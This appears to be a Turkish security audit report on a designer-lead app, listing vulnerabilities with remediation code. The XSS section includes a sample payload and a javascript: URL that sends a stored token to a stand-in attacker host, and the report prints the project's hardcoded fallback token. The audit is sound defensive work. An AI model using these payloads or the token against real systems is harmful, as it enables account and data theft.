# 🛡️ StudioFinder İstanbul — Güvenlik Denetim ve Zafiyet Raporu (Security Audit)

**Tarih:** 17 Kasım 2026  
**Hedef Proje:** Tasarımcı Radarı (`tasarimci-radari`)  
**Hedef Repo:** [github.com/kabaoglueness/tasarimci-radari](https://github.com/kabaoglueness/tasarimci-radari)  
**Denetim Kapsamı:** Kaynak Kod Analizi, Statik Güvenlik Taraması (SAST), API & Backend Mimarisi, Frontend DOM Güvenliği, Mobil (Capacitor/Android) Yapılandırması.

---

## 📊 Yönetici Özeti (Executive Summary)

* **Genel Güvenlik Skoru:** **42 / 100 (Yüksek Risk / High Risk)**
* **Genel Değerlendirme:** Projede iyi niyetli temel korumalar (Path Traversal chroot denetimi, DNS çözümleme kontrolü, özel başlıklar) uygulanmış olsa da; **açık GitHub reposuna sızan sabit gizli anahtar (hardcoded secret), DOM XSS açıkları, sunucuyu çökerten HTTP başlık hatası ve mobil şifresiz iletişim ayarları** nedeniyle sistem saldırılara açıktır.

### Zafiyet Dağılımı

| Seviye | Adet | Kategori | Durum |
| :--- | :---: | :--- | :--- |
| 🔴 **KRİTİK** | 1 | Kimlik Doğrulama & Yetki Aşımı (Hardcoded Secret Token) | Çözüm Bekliyor |
| 🟠 **YÜKSEK** | 2 | DOM XSS (InnerHTML Injection) & Remote DoS (Header Crash) | Çözüm Bekliyor |
| 🟡 **ORTA** | 4 | Android Cleartext, Zayıf CSP & CORS, TOCTOU SSRF, SQLite Lock | Çözüm Bekliyor |
| 🔵 **DÜŞÜK** | 2 | Açık PII Verisi, Binary Dosyalar & Geniş JSON Erişimi | Çözüm Bekliyor |

---

## 🔴 1. [KRİTİK] GitHub Reposunda İfşa Olan Hardcoded Master Secret Token & Auth Bypass

* **Etkilenen Dosya:** `api/search-real.py` (Satır 18)
* **Zafiyet Türü:** CWE-798: Use of Hard-coded Credentials / CWE-287: Improper Authentication
* **Zafiyetli Kod:**
  ```python
  # api/search-real.py:18
  SECRET_ACCESS_TOKEN = os.environ.get("STUDIO_SECRET_TOKEN", "sf_master_secret_2026")
  ```

### İstismar Senaryosu:
1. Kaynak kod kamuya açık GitHub reposundadır. Vercel ortamında `STUDIO_SECRET_TOKEN` tanımlanmamışsa sistem otomatik olarak `"sf_master_secret_2026"` değerine düşer.
2. Herhangi bir saldırgan `https://<vercel-alan-adi>/api/search-real?token=sf_master_secret_2026` adresine istek atarak canlı LinkedIn kazıma motorunu sınırsızca tetikleyebilir.
3. Ek olarak `user_token == SECRET_ACCESS_TOKEN` kontrolü standart eşitlik (`==`) ile yapıldığı için **Timing Attack (Zamanlama Analizi)** zafiyeti barındırır.
4. Token URL query parametresi (`?token=...`) ile taşındığı için tarayıcı geçmişine, proxy sunucularına ve sunucu erişim loglarına sızar.

### Düzeltme (Remediation):
```python
import hmac
import os

# Fallback anahtar ASLA kod içine yazılmamalıdır
SECRET_ACCESS_TOKEN = os.environ.get("STUDIO_SECRET_TOKEN")

# Doğrulama sabit zamanlı karşılaştırma ile yapılmalıdır:
is_live = False
if SECRET_ACCESS_TOKEN and user_token:
    if hmac.compare_digest(user_token.encode('utf-8'), SECRET_ACCESS_TOKEN.encode('utf-8')):
        is_live = True
```

---

## 🟠 2. [YÜKSEK] DOM-Based & Stored XSS (InnerHTML Güvensiz Veri Enjeksiyonu)

* **Etkilenen Dosya:** `src/app.js` (Satırlar 242-306 ve 484-575)
* **Zafiyet Türü:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
* **Zafiyetli Kod:**
  ```javascript
  // src/app.js:249
  container.innerHTML = leads.map(lead => {
    ...
    <h3 class="..."> ${lead.name} </h3>
    <div class="..."> ${cleanProblem} </div>
    ${lead.needed_services.map(svc => `<span>${svc}</span>`).join('')}
  ```
  ```javascript
  // src/app.js:484
  <a href="${directUrl}" ...>
  <textarea id="lead-notes-area">${lead.notes || ''}</textarea>
  ```

### İstismar Senaryosu:
1. Dış veri kaynaklarından (LinkedIn, OpenStreetMap veya yerel veritabanı) gelen metinler filtrelenmeden doğrudan şablon dizgilerine (`template literals`) ve oradan `container.innerHTML` ve `panel.innerHTML` içine basılmaktadır.
2. Eğer bir işletme adı veya ilan başlığı `"><img src=x onerror=alert(document.cookie)>` içerirse veya `directUrl` değeri `javascript:fetch('//attacker.com?leak='+localStorage.getItem('design_radar_secret_token'))` olursa, kullanıcı kartı veya linki tıkladığı anda saldırganın JavaScript kodu tarayıcıda çalışır.
3. Kurbanın `localStorage` üzerindeki tüm kayıtlı token ve notları saniyeler içinde çalınabilir.

### Düzeltme (Remediation):
Tüm dinamik değerler HTML varlıklarına (entities) dönüştürülmeli ve URL'ler doğrulanmalıdır:
```javascript
function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function sanitizeUrl(url) {
  if (!url || typeof url !== 'string') return '#';
  const clean = url.trim();
  if (clean.startsWith('http://') || clean.startsWith('https://')) return clean;
  return '#';
}
```

---

## 🟠 3. [YÜKSEK] HTTP Header 'Latin-1' Kodlama Hatası ve Uzaktan DoS (API Crash)

* **Etkilenen Dosya:** `server.py` (Satır 768)
* **Zafiyet Türü:** CWE-400: Uncontrolled Resource Consumption / CWE-113: HTTP Response Splitting & Encoding Crash
* **Zafiyetli Kod:**
  ```python
  # server.py:768
  self.send_header('X-Last-Sync', get_last_sync_time())
  ```
* **Gerçek Hata Logu (Test Esnasında Üretildi):**
  ```
  2026-11-17 [ERROR] Beklenmeyen istek hatası: 'latin-1' codec can't encode character '\u0131' in position 27: ordinal not in range(256)
  127.0.0.1 - "GET /api/search-real?query=Kafe HTTP/1.1" 500
  ```

### İstismar Senaryosu:
`get_last_sync_time()` Türkçe "tarandı", "kapandı" kelimelerindeki `ı` (\u0131) karakterini döndürmektedir. Python'ın standart `http.server` kütüphanesi HTTP başlıklarını `latin-1` olarak kodlamaya çalışır. Bu karakter aralık dışı olduğu için sunucu başlık aşamasında patlar, bağlantı kopar (`IncompleteRead`), istemciye 500 döner ve API felç olur.

### Düzeltme (Remediation):
```python
import urllib.parse
# Başlık değeri URL-encode veya ASCII güvenli hale getirilmelidir:
safe_last_sync = urllib.parse.quote(str(get_last_sync_time()))
self.send_header('X-Last-Sync', safe_last_sync)
```

---

## 🟡 4. [ORTA] Android Şifresiz Ağ İletişimi (Cleartext HTTP) ve Güvensiz Yedekleme

* **Etkilenen Dosyalar:** `capacitor.config.json` (Satır 6), `android/app/src/main/AndroidManifest.xml` (Satır 5, 10)
* **Zafiyet Türü:** CWE-319: Cleartext Transmission of Sensitive Information / CWE-530: Exposure of Backup File
* **Zafiyetli Kod:**
  ```json
  "server": { "cleartext": true }
  ```
  ```xml
  <application
      android:allowBackup="true"
      android:usesCleartextTraffic="true" ...>
  ```

### İstismar Senaryosu:
1. `usesCleartextTraffic="true"` ve `cleartext: true`: Android uygulamasının güvensiz `http://` protokolü üzerinden iletişim kurmasına izin verir. Açık Wi-Fi ağlarında MitM saldırılarıyla kullanıcı verileri dinlenebilir veya enjekte edilebilir.
2. `allowBackup="true"`: Fiziksel erişim veya ADB yetkisi olan bir saldırgan `adb backup` komutuyla uygulamanın `localStorage` verilerini (özel token'lar dahil) cihazdan dışa aktarabilir.

### Düzeltme (Remediation):
```xml
<!-- AndroidManifest.xml -->
<application
    android:allowBackup="false"
    android:usesCleartextTraffic="false"
    android:theme="@style/AppTheme">
```

---

## 🟡 5. [ORTA] Zayıf CSP & Aşırı İzin Verici CORS (Cross-Origin Data Harvesting)

* **Etkilenen Dosya:** `server.py` (Satırlar 686-695)
* **Zafiyet Türü:** CWE-942: Permissive Cross-Domain Policy with Untrusted Domains
* **Zafiyetli Kod:**
  ```python
  self.send_header(
      "Content-Security-Policy",
      "default-src 'self' 'unsafe-inline' https: data:; "
      "img-src 'self' data: https: https://images.unsplash.com https://media.licdn.com; "
      "font-src 'self' https: data:; "
      "connect-src 'self' https:;"
  )
  self.send_header("Access-Control-Allow-Origin", "*")
  ```

### İstismar Senaryosu:
1. `Content-Security-Policy` içerisinde `'unsafe-inline'` ve kontrolsüz `https:` bulunması XSS korumasını hükümsüz kılar. Saldırgan herhangi bir SSL sertifikalı alan adından zararlı payload çekebilir.
2. Sunucu `0.0.0.0` üzerinde dinleme yaparken `Access-Control-Allow-Origin: *` başlığı basılması sebebiyle, yerel ağdaki bir kullanıcının tarayıcısında açtığı herhangi bir web sitesi, kurbanın `http://192.168.1.X:8090/api/search-real` adresine çapraz istek (cross-origin request) atarak intranet radar verilerini sessizce çalabilir.

### Düzeltme (Remediation):
Sunucu varsayılan olarak `127.0.0.1` dinlemeli, CORS yalnızca yetkili istemcilere açılmalı ve CSP'deki `'unsafe-inline'` kaldırılmalıdır.

---

## 🟡 6. [ORTA] DNS Rebinding (TOCTOU) & Liveness SSRF Denetim Tutarsızlığı

* **Etkilenen Dosya:** `server.py` (Satırlar 379-404 ve 409-443)
* **Zafiyet Türü:** CWE-918: Server-Side Request Forgery (SSRF) / CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition

### İstismar Senaryosu:
1. `make_safe_http_request`: IP adresi `socket.gethostbyname` ile kontrol edildikten sonra `urllib.request.urlopen` tekrar bağımsız bir DNS sorgusu yapar (DNS Rebinding riski).
2. `verify_single_job_active(url)` fonksiyonunda ise `make_safe_http_request` **kullanılmamış**, doğrudan `urllib.request.urlopen(req)` çağrılmıştır. İzin verilen domain yönlendirmeleriyle yerel ağ veya cloud metadata IP'lerine (`169.254.169.254`) istek atılması riski doğar.

### Düzeltme (Remediation):
Tüm dış HTTP istekleri tek bir güvenli istemci fonksiyonundan geçirilmeli, IP adresine doğrudan bağlanılıp Host başlığı manuel atanmalıdır.

---

## 🟡 7. [ORTA] SQLite Lock / Eşzamanlılık Kilitlenmesi ve LIKE ReDoS

* **Etkilenen Dosya:** `server.py` (Satırlar 221-305)
* **Zafiyet Türü:** CWE-400: Uncontrolled Resource Consumption

### İstismar Senaryosu:
1. Çok iş parçacıklı (`ThreadedHTTPServer`) mimaride arka plan senkronizasyon thread'i veritabanına yazarken, gelen kullanıcı arama istekleri `sqlite3.OperationalError: database is locked` hatası üretebilir (WAL modu kapalıdır).
2. Arama girdisindeki `%` ve `_` karakterleri escape edilmediğinde SQLite tam tablo taraması yaparak yüksek CPU tüketimine sebep olur.

### Düzeltme (Remediation):
```python
# init_db() içerisine eklenmelidir:
cursor.execute("PRAGMA journal_mode=WAL;")
cursor.execute("PRAGMA busy_timeout=5000;")
```

---

## 🔵 8. [DÜŞÜK] GitHub Reposunda Açık Kişisel/İşletme İletişim Verileri (PII)

* **Etkilenen Dosya:** `data/leads.json` (Satırlar 194-195)
* **Açıklama:**
  Doğrudan işletme telefon numarası (`+90 212 356 10 57`) ve e-posta adresi (`hello@petracoffee.com`) kamuya açık GitHub reposuna yüklenmiştir. Bu veriler botlar tarafından toplanıp spam listelerine eklenebilir. Gerçek iletişim verileri yerine yerel ortam değişkenleri veya maskelenmiş mock veriler kullanılmalıdır.

---

## 🎯 Öncelikli Güvenlik İyileştirme Planı (Action Checklist)

- [ ] **Faz 1 (Acil / Hotfix):** `api/search-real.py` içindeki fallback token'ı sil ve sabit zamanlı doğrulama (`hmac.compare_digest`) ekle.
- [ ] **Faz 2 (Frontend Sıkılaştırma):** `src/app.js` içine `escapeHtml` ve `sanitizeUrl` fonksiyonlarını entegre ederek tüm DOM enjeksiyonlarını engelle.
- [ ] **Faz 3 (Backend & DoS Çözümü):** `server.py` içindeki `X-Last-Sync` başlığını URL-encode yap; `init_db` içine SQLite WAL modunu ekle.
- [ ] **Faz 4 (Mobil Sıkılaştırma):** `AndroidManifest.xml` ve `capacitor.config.json` dosyalarında cleartext yetkisini prodüksiyon için kapat.
- [ ] **Faz 5 (Temizlik & Git):** `data/leads.json` içerisindeki açık telefon/e-posta verilerini anonimleştir ve repoyu güncelle.
